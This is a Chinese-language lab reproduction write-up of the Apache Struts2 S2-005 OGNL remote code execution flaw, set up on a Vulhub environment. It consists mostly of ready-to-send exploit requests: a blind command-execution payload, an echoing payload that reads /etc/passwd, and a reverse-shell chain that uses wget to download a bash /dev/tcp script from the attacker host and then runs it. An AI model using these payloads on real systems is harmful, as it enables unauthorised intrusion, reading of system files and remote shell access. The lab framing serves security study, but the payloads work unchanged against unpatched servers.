# Struts2 S2-005 远程代码执行漏洞

## 影响版本

影响版本: 2.0.0 - 2.1.8.1

## 环境搭建

Vulhub执行以下命令启动s2-005测试环境：

```plain
docker-compose build
docker-compose up -d
```

## 漏洞复现

执行任意命令POC（无回显，空格用@代替）：

```plain
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/awesome_poc%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: target:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912593685-77974e9a-fef0-4d6e-8725-1034c4e218b8.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912593595-1e138e11-244b-4661-a2c6-54de85c3f359.png)

网上一些POC放到tomcat8下会返回400，研究了一下发现字符\、"不能直接放path里，需要urlencode，编码以后再发送就好了。这个POC没回显。

POC用到了OGNL的Expression Evaluation：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912594225-d94f5c29-21ad-468b-9a1c-9c20799ff34a.png)大概可以理解为，(aaa)(bbb)中aaa作为OGNL表达式字符串，bbb作为该表达式的root对象，所以一般aaa位置如果需要执行代码，需要用引号包裹起来，而bbb位置可以直接放置Java语句。(aaa)(bbb)=true实际上就是aaa=true。不过确切怎么理解，还需要深入研究，有待优化。

期待大佬研究出有回显的POC。

### 执行任意命令POC（有回显，将需要执行的命令进行urlencode编码）

```plain
POST /example/HelloWorld.action HTTP/1.1
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
Host: target:8080
Content-Length: 626
redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912594009-26c19b97-986b-4d51-99f0-991dd6b6eb58.png)

### 反弹shell

编写shell脚本并启动http服务器：

```plain
echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
python3环境下：python -m http.server 80
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912594054-17414943-3eb4-4ac2-bca9-7921292cb5ef.png)

上传shell.sh文件的命令为：

```plain
wget 192.168.174.128/shell.sh
```

上传shell.sh文件的Payload为：

```plain
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22wget@192.168.174.128/shell.sh%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912594309-f58566a0-4639-45ed-9f7a-bb54bf78e037.png)

执行shell.sh文件的命令为：

```plain
bash /usr/local/tomcat/shell.sh
```

执行shell.sh文件的Payload为：

```plain
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22bash@/usr/local/tomcat/shell.sh%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912595325-2e3a094b-d936-4750-817d-8c295b72c0de.png)

成功接收反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780912595616-50c92284-7fe7-4f7c-95f4-89155ef10d4a.png)